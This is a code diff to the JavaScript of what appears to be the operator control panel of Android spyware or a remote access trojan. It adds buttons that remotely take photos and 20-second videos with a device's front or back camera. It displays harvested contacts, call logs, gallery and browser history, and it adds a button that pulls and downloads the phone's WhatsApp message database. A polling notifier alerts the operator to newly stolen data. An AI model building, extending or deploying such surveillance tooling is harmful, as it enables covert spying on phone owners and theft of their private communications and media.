@@ -157,13 +157,13 @@ function addTodo(entry){
     function init_cameras(){
       var cameras=parseInt(active_device.cameras);
       var htmlString='';
-        htmlString+='<button class="btn-camera btn btn-primary btn-xs" onclick="camera(0)">Primary Snap</button>';
+        htmlString+='<button class="btn-camera btn btn-primary btn-xs" onclick="camera(0)">Snap Back</button>';
       if(cameras==2){
-        htmlString+='<button class="btn-camera btn btn-info btn-xs" onclick="camera(1)">Secondary Snap</button>';
+        htmlString+='<button class="btn-camera btn btn-info btn-xs" onclick="camera(1)">Snap Front</button>';
       }
-      htmlString+='<button class="btn-camera btn btn-primary btn-xs" onclick="video(0,20)">Primary Vid</button>';
+      htmlString+='<button class="btn-camera btn btn-primary btn-xs" onclick="video(0,20)">Vid Back</button>';
     if(cameras==2){
-      htmlString+='<button class="btn-camera btn btn-info btn-xs" onclick="video(1,20)">Secondary Vid</button>';
+      htmlString+='<button class="btn-camera btn btn-info btn-xs" onclick="video(1,20)">Vid Front</button>';
 
     }
       $("#camera_button_holder").html(htmlString);
@@ -377,6 +377,9 @@ function addTodo(entry){
       if(devices[i].saved_gallery!=null){
             cache+='&nbsp;<span class="label label-success">Gallery</span>';
       }
+      if(devices[i].saved_history!=null){
+            cache+='&nbsp;<span class="label label-success">Browser History</span>';
+      }
       if(cache.length==0){
         cache="--";
         cach=0;
@@ -401,7 +404,14 @@ function addTodo(entry){
 
 function load_advance(id){
     var index=$(id).attr("data-index");
+    if(active_device && active_device.did!=devices[index].did){
+      $("#gallery_fetch").html("");
+      $("#calllog_fetch").html("");
+      $("#contacts_fetch").html("");
+      $("#browserhistory_fetch").html("");
+    }
     active_device=devices[index];
+
     init_cameras();
     if(devices[index].saved_contacts!=null){
         build_contacts_table(devices[index].saved_contacts);
@@ -409,7 +419,8 @@ function load_advance(id){
     if(devices[index].saved_calllog!=null){
         build_call_log_table(devices[index].saved_calllog);
     }
-    if(devices[index].saved_whatsapp!=null){
+    if(devices[index].saved_history!=null){
+        build_browserhistory(devices[index].saved_history);
     }
     if(devices[index].saved_gallery!=null){
 
@@ -421,10 +432,16 @@ function load_advance(id){
     $("#info_window_devuser").html("Primary Account : " + devices[index].device_account);
     $("#info_window_dev_api").html("SDK Version : API " + devices[index].device_api+" "+get_API_name(parseInt(devices[index].device_api)));
     $("#info_window_last_seen").html("Last Activity: " + get_elapsed_time(parseInt(devices[index].last_seen)));
-    if(devices[index].active==0)
-    $("#info_window_current_status").html("Current Status : " + '<span class="label label-default">Inactive</span>');
-    else
+    if(devices[index].active==0){
+      $("#info_window_current_status").html("Current Status : " + '<span class="label label-default">Inactive</span>');
+    }
+    else{
     $("#info_window_current_status").html("Current Status : " + '<span class="label label-success">Active</span>');
+    }
+    if(devices[index].saved_whatsapp == null)
+    $("#info_window_whatsapp").html("Whats App : " + '<button type="button" onclick="whatsapp()" class="btn btn-warning btn-xs">Pull MsgStore</button>');
+    else
+    $("#info_window_whatsapp").html("Whats App : " + '<button type="button" onclick="whatsapp()" class="btn btn-warning btn-xs">Pull MsgStore</button>&nbsp;<a type="button" href="../data/'+devices[index].saved_whatsapp+'"  class="btn btn-success btn-xs">Download MsgStore</a>');
     active_device=devices[index];
     $("#advanced-menu-dynamic").css("display","block");
     $("#no-dev-placeholder").css("display","none");
@@ -432,6 +449,7 @@ function load_advance(id){
     init_IonRangeSlider();
     switch_next("advanced-stats");
   }
+
   		function init_IonRangeSlider() {
   			if( typeof ($.fn.ionRangeSlider) === 'undefined'){
           return;
@@ -479,4 +497,62 @@ $(document).ready(function(){
       switch_next(next);
       $(this).addClass("active");
   });
+
+  $("#notif_clicker").click(function(){
+      console.log("CLICKED");
+      $.getJSON("../db/get_unread_notification.php",function(data){
+        console.log(data);
+        $("#notif_counter").html("");
+      });
+  });
+  notification_start();
+  notifier();
 });
+
+function notifier(){
+  $.getJSON("../db/get_notification.php",function(data){
+    var counter=0;
+    var htmlString="";
+    for(var i = 0 ; i<data.length;i++){
+      if(data[i].read=="1")
+        return;
+      counter++;
+      var item="<li><h5><span class=\"image\"><i style=\"font-size:20px;\" class=\"fa ";
+      switch (data[i].type) {
+        case "dev":
+          item+=" fa-mobile "
+          break;
+          case "clog":
+            item+=" fa-phone ";
+            break;
+          case "cont":
+            item+=" fa-address-card ";
+            break;
+          case "gal":
+            item+=" fa-file-image-o ";
+            break;
+          case "browser":
+            item+=" fa-globe ";
+            break;
+          case "wac":
+            item+="  fa-whatsapp  ";
+            break;
+          default: item+="  fa-microchip  ";
+      }
+      item+=" \"></i></span>&nbsp;&nbsp;<span>"+data[i].device_id+"</span></h5>";
+      item+="<span class=\"message\">"+data[i].text+"</span>";
+      item+="<br><small><span class=\"time\">"+get_elapsed_time((Math.ceil(new Date().getTime()/1000) - parseInt(data[i].time)))+"</span></small>"
+      item+="</li>";
+      htmlString+=item;
+    }
+    $("#notif_menu").html(htmlString);
+    if(counter>0)
+    $("#notif_counter").html(counter);
+    else $("#notif_counter").html("");
+  });
+}
+function notification_start(){
+  setInterval(function(){
+    notifier();
+  },10000);
+}
